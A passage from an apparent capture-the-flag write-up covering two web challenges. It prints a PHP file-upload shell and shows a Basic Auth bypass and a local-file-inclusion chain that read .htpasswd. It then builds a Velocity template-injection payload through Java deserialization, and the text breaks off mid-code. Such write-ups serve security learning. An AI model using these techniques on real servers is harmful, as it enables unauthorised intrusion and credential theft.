<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">git clone https://github.com/anouarbensaad/vulnx.git
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">mkdir cat VulnX.php
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">touch shell.php
</span></span><span class="line"><span class="cl">chmod 777 shell.php 
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p>Check folder /usr/share/vulnx/</p>
<p><img src="https://hackmd.io/_uploads/SygnW5jixJx.png" alt="image"></p>
<p>Found that the file /usr/share/vulnx/shell/VulnX.php can be exploited to upload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;Vuln&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&#34;X&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;center&gt;&lt;b&gt;Uname:&#34;</span><span class="o">.</span><span class="nx">php_uname</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&lt;/b&gt;&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;font color=&#34;black&#34; size=&#34;4&#34;&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filedir</span> <span class="o">=</span> <span class="s2">&#34;uploads/&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$maxfile</span> <span class="o">=</span> <span class="s1">&#39;2000000&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$mode</span> <span class="o">=</span> <span class="s1">&#39;0644&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$userfile_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$userfile_tmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$qx</span> <span class="o">=</span> <span class="nv">$filedir</span><span class="o">.</span><span class="nv">$userfile_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$userfile_tmp</span><span class="p">,</span> <span class="nv">$qx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">chmod</span> <span class="p">(</span><span class="nv">$qx</span><span class="p">,</span> <span class="nx">octdec</span><span class="p">(</span><span class="nv">$mode</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="s2">&#34; &lt;a href=</span><span class="si">$userfile_name</span><span class="s2">&gt;&lt;center&gt;&lt;b&gt;Uploaded Success ==&gt; </span><span class="si">$userfile_name</span><span class="s2">&lt;/b&gt;&lt;/center&gt;&lt;/a&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="s1">&#39;&lt;form method=&#34;POST&#34; action=&#34;#&#34; enctype=&#34;multipart/form-data&#34;&gt;&lt;input type=&#34;file&#34; name=&#34;image&#34;&gt;&lt;br&gt;&lt;input type=&#34;Submit&#34; name=&#34;Submit&#34; value=&#34;Upload&#34;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;/center&gt;&lt;/font&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>However, the owner of these folders is root. While if using the web to upload, it will be in the ww-data user. However, the file /usr/share/vulnx/shell/uploads/shell.html is a &ldquo;world writable&rdquo; file.</p>
<p><img src="https://hackmd.io/_uploads/rJ3T5oslye.png" alt="image"></p>
<p>=&gt; We now can use <code>RewriteRule ^/website-(.*).doc$ /$1.html</code> and VulnX.php to upload a file to overwrite the shell.html file. But how to use the uploaded file to read the flag at <code>.htpasswd</code>.</p>
<p>Here the admin.php file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span> <span class="nx">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Admin</span> <span class="nx">Page</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Welcome</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">Admin</span> <span class="nx">Page</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pages&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pages&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nv">$page</span> <span class="o">=</span> <span class="s2">&#34;./pages/&#34;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pages&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;a href=&#34;?pages=1&#34;&gt; Link &lt;/a&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></div><p>Contains an LFI vulnerability. However, to access admin.php, we need to go through Basic Auth due to the .htaccess file. We can bypass basic auth by using <code>admin.php%3Fooo.php</code> like in orange&rsquo;s blog. And then use this LFI vuln to view the shell.html file with bad content to get the flag from <code>.htpasswd</code></p>
<p>Now we got the chain: Upload shell.html -&gt; view this file using admin.php</p>
<p><img src="https://hackmd.io/_uploads/BkjcWnjl1l.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ByiaZ2olJg.png" alt="image"></p>
<p><em>Something happened that I can&rsquo;t exploit on the server anymore. Only have the screenshot of the flag taken by my teammate @teebow1e</em></p>
<p><img src="https://hackmd.io/_uploads/S1zSMnsgyl.png" alt="image"></p>
<h3 id="hihi">
<a class="header-anchor" href="#hihi"></a>
hihi
</h3><p><img src="https://hackmd.io/_uploads/SyR-09ilJx.png" alt="image"></p>
<p>This website uses spring boot and Velocity</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependencies</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="n">springframework</span><span class="o">.</span><span class="n">boot</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">spring</span><span class="o">-</span><span class="n">boot</span><span class="o">-</span><span class="n">starter</span><span class="o">-</span><span class="n">web</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="n">springframework</span><span class="o">.</span><span class="n">boot</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">spring</span><span class="o">-</span><span class="n">boot</span><span class="o">-</span><span class="n">starter</span><span class="o">-</span><span class="n">test</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">scope</span><span class="o">&gt;</span><span class="n">test</span><span class="o">&lt;/</span><span class="n">scope</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">velocity</span><span class="o">.</span><span class="n">tools</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">velocity</span><span class="o">-</span><span class="n">tools</span><span class="o">-</span><span class="n">generic</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="mf">3.0</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">velocity</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">velocity</span><span class="o">-</span><span class="n">engine</span><span class="o">-</span><span class="n">core</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="mf">2.3</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">dependencies</span><span class="o">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@PostMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@ResponseBody</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">hello</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="s">&#34;data&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">hexString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">data</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">byteArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encode</span><span class="p">.</span><span class="na">hexToBytes</span><span class="p">(</span><span class="n">hexString</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayInputStream</span><span class="w"> </span><span class="n">bis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">byteArray</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecureObjectInputStream</span><span class="p">(</span><span class="n">bis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Users</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Users</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">name</span><span class="o">=</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getName</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;But... For what?&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">templateString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;Hello, &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="o">+</span><span class="s">&#34;. Today is $date&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Velocity</span><span class="p">.</span><span class="na">init</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">VelocityContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">VelocityContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LocalDate</span><span class="w"> </span><span class="n">date</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocalDate</span><span class="p">.</span><span class="na">now</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DateTimeFormatter</span><span class="w"> </span><span class="n">formatter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DateTimeFormatter</span><span class="p">.</span><span class="na">ofPattern</span><span class="p">(</span><span class="s">&#34;MMMM dd, yyyy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">formattedDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">date</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">formatter</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;date&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">formattedDate</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">StringWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Velocity</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;test&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">templateString</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">out</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>The MainController class controls all the logic of the website. Basically, the website will work like this:</p>
<ul>
<li>A GET request at / that returns a simple &ldquo;hey&rdquo; string.</li>
<li>A POST request at /, which receives a data parameter that undergoes base64 decoding, hex decoding, and deserialization into a Users object. -&gt; Then use the getName method to get the username.</li>
<li>The username will be put into a template and returned to the user</li>
</ul>
<p>-&gt; Can be SSTI. There are many articles about velocity SSTI but all of them need to use <code>#set</code> to create a variable then getClass and start using other java Classes from that.</p>
<ul>
<li><a href="https://iwconnect.com/apache-velocity-server-side-template-injection/">https://iwconnect.com/apache-velocity-server-side-template-injection/</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
</ul>
<p>But server has blocked the <code>#</code> character -&gt; need a variable available to trigger the error. And right in MainController there is a variable <code>$data</code></p>
<p>This is my the payload serialize, hex encode, base64 encode</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SerializationTest</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Step 1: Create a Users object and set the name</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Users</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Users</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">user</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;payload&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Step 2: Serialize the Users object</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">baos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">baos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">user</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serializedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">baos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Step 3: Convert serialized bytes to hex</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">hexString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">serializedBytes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">hexString</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&#34;%02x&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Step 4: Encode the hex string in base64</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">base64Encoded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">hexString</span><span class="p">.</span><span class="na">toString</span><span class="p">().</span><span class="na">getBytes</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Base64 Encoded Serialized Object: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">base64Encoded</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Step 5: Decode the base64 string, convert back from hex, and deserialize</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">decodedHex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">base64Encoded</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encode</span><span class="p">.</span><span class="na">hexToBytes</span><span class="p">(</span><span class="n">decodedHex</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ByteArrayInputStream</span><span class="w"> </span><span class="n">bais</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">decodedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecureObjectInputStream</span><span class="p">(</span><span class="n">bais</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// Step 6: Deserialize the object</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Users</span><span class="w"> </span><span class="n">deserializedUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Users</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
